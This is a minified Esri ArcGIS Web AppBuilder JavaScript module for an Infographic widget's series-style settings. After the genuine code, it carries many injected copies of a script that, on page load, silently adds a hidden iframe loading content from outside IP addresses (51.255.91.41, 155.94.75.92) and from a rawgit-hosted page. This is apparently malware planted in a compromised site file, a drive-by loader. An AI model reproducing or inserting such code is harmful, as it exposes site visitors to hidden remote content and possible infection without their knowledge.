// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Infographic/setting/dijitsSetting/_dijits/SeriesStyle.html":'\x3cdiv style\x3d"width: 100%;flex: 0 0 100%;"\x3e\r\n\r\n\t\x3cdiv style\x3d"margin-bottom: 15px" class\x3d"top"\x3e\r\n\t\t\x3cdiv class\x3d"flex-lr-balance title"\x3e${nls.chartColor}\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"singleColorDiv"\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\r\n\t\x3cdiv data-dojo-attach-point\x3d"radioPanel" class\x3d"radio-panel"\x3e\r\n\t\t\x3cdiv class\x3d"single-radio-panel"\x3e\r\n\t\t   \x3cinput data-dojo-attach-point\x3d"useLayerSymbolRadio" data-dojo-attach-event\x3d"change:_onUseLayerSymbolChange" type\x3d"radio" name\x3d"chartColor" data-dojo-type\x3d"dijit/form/RadioButton"\x3e\r\n   \t\t\x3clabel class\x3d"marginleft10 text-over radio-label" title\x3d"${nls.useLayerSymbology}"\x3e${nls.useLayerSymbology}\x3c/label\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n      \x3cdiv style\x3d"margin-top: 2px" class\x3d"color-radio-panel"\x3e\r\n         \x3cdiv class\x3d"single-radio-panel flex-lr-balance"\x3e\r\n            \x3cinput data-dojo-attach-point\x3d"setColorRadio" type\x3d"radio" name\x3d"chartColor" data-dojo-type\x3d"dijit/form/RadioButton"\x3e\r\n            \x3clabel class\x3d"marginleft10 text-over radio-label" title\x3d"${nls.setColor}"\x3e${nls.setColor}\x3c/label\x3e\r\n         \x3c/div\x3e\r\n\r\n         \x3cdiv data-dojo-attach-point\x3d"radioSingleColorDiv" class\x3d"radio-single-color-div flex-lr-balance"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n\t\t\r\n\t\x3c/div\x3e\r\n\r\n   \x3cdiv data-dojo-attach-point\x3d"fieldColors" class\x3d"field-colors"\x3e\r\n   \x3c/div\x3e\r\n\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/on dojo/_base/lang dojo/_base/html dojo/text!./SeriesStyle.html ./_SeriesStyleItem ./_SeriesStyles jimu/utils dojo/Evented dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dijit/form/RadioButton".split(" "),function(g,e,c,d,h,f,k,l,m,n,p,q){return g([n,p,q,m],{baseClass:"infographic-series-style",templateString:h,constructor:function(){this.inherited(arguments);this.PRE_MODLE={computed:{},config:{}}},postCreate:function(){this.inherited(arguments);
this._initDom();this._initEvent();this._render()},updateComputed:function(a){a&&(this.PRE_MODLE=c.clone(this.modle),this.modle.computed=c.clone(a),this._render())},setConfig:function(a){this.modle.config=c.clone(a);this._render()},getConfig:function(){return c.clone(this.modle.config)},_render:function(){this.modle&&(this.ignoreChangeEvents=!0,this._renderByComputed(this.modle),this._renderByConfig(this.modle),this.ignoreChangeEvents=!1,this._onChange())},_onChange:function(){if(!this.ignoreChangeEvents){var a=
this.getConfig();a&&this.emit("change",a)}},_renderByComputed:function(a){var b=this.PRE_MODLE.computed;a=a.computed;this._isEqual(b,a)||(this._isEqual(a.radioPanel,b.radioPanel)||(a.radioPanel?this._showRadioPanel():this._hideRadioPanel()),a.showOpacity?this._showOpacityPanel():this._hideOpacityPanel(),this._isEqual(a.colorSingleMode,b.colorSingleMode)||(a.colorSingleMode?this._useColorSingleMode():this._useColorMultipleMode()),!this._isEqual(a.radioPanel,b.radioPanel)&&a.radioPanel?(this._hideSingleColor(!1),
d.addClass(this.fieldColors,"indentation"),a.radioPanel.singleColor?this._showSingleColor(!0):this._hideSingleColor(!0)):(this._hideSingleColor(!0),d.removeClass(this.fieldColors,"indentation"),this._isEqual(a.singleColor,b.singleColor)||(a.singleColor?this._showSingleColor(!1):this._hideSingleColor(!1),a.fieldColors?this._showFieldColors():this._hideFieldColors())))},_renderByConfig:function(a){var b=a.config,c=a.computed;a=!1;c.radioPanel&&(this._hideFieldColors(),c.radioPanel.fieldColors&&(a=!0));
c=this.PRE_MODLE.config;this._isEqual(b,c)||(b.useLayerSymbology?(this._hideFieldColors(),this._hideSingleColor(!0)):a?this._showFieldColors():this._showSingleColor(!0),this._isEqual(b.useLayerSymbology,c.useLayerSymbology)||(b.useLayerSymbology?(this.useLayerSymbolRadio.setChecked(!0),this.setColorRadio.setChecked(!1)):(this.useLayerSymbolRadio.setChecked(!1),this.setColorRadio.setChecked(!0))),this._isEqual(b.styles,c.styles)||!(b=b.styles)||0>=b.length||(1===b.length?(this.topOneColor.setConfig(b[0]),
this.radioOneColor.setConfig(b[0])):1<=b.length&&this.fieldColorsDijit.updateConfig(b)))},_initDom:function(){this.topOneColor=new f({option:{showText:!1,opacity:{min:0,max:10,step:1}}});this.topOneColor.placeAt(this.singleColorDiv);this.radioOneColor=new f({option:{showText:!1,opacity:{min:0,max:10,step:1}}});this.radioOneColor.placeAt(this.radioSingleColorDiv);this.fieldColorsDijit=new k({nls:this.nls});this.fieldColorsDijit.placeAt(this.fieldColors);this._hideRadioPanel();this._hideOpacityPanel();
this._hideSingleColor(!0);this._hideSingleColor(!1);this._hideFieldColors()},_initEvent:function(){this.own(e(this.topOneColor,"change",c.hitch(this,function(a){this._onTopOneColorChange(a)})));this.own(e(this.radioOneColor,"change",c.hitch(this,function(a){this._onRadioOneColorChange(a)})));this.own(e(this.fieldColorsDijit,"change",c.hitch(this,function(a){this._onFieldColorsDijitChange(a)})))},_showSingleColor:function(a){a?d.removeClass(this.radioSingleColorDiv,"hide"):d.removeClass(this.singleColorDiv,
"hide")},_hideSingleColor:function(a){a?d.addClass(this.radioSingleColorDiv,"hide"):d.addClass(this.singleColorDiv,"hide")},_showFieldColors:function(){d.removeClass(this.fieldColors,"hide")},_hideFieldColors:function(){d.addClass(this.fieldColors,"hide")},_useColorSingleMode:function(){this.topOneColor.setColorMode(!0);this.radioOneColor.setColorMode(!0)},_useColorMultipleMode:function(){this.topOneColor.setColorMode(!1);this.radioOneColor.setColorMode(!1)},_showRadioPanel:function(){d.removeClass(this.radioPanel,
"hide")},_hideRadioPanel:function(){d.addClass(this.radioPanel,"hide")},_showOpacityPanel:function(){this.topOneColor.setOpacityDisplay(!0);this.radioOneColor.setOpacityDisplay(!0);this.fieldColorsDijit.setOpacityDisplay(!0)},_hideOpacityPanel:function(){this.topOneColor.setOpacityDisplay(!1);this.radioOneColor.setOpacityDisplay(!1);this.fieldColorsDijit.setOpacityDisplay(!1)},_isEqual:function(a,b){return typeof a!==typeof b?!1:"object"!==typeof a?a===b:l.isEqual(a,b)},_onTopOneColorChange:function(a){this.ignoreChangeEvents||
(this.PRE_MODLE=c.clone(this.modle),this.modle.config.styles[0]=a,this._onChange())},_onRadioOneColorChange:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=c.clone(this.modle),this.modle.config.styles[0]=a,this._onChange())},_onFieldColorsDijitChange:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=c.clone(this.modle),this.modle.config.styles=a,this._onChange())},_onUseLayerSymbolChange:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=c.clone(this.modle),this.modle.config.useLayerSymbology=
a,this._onChange())}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});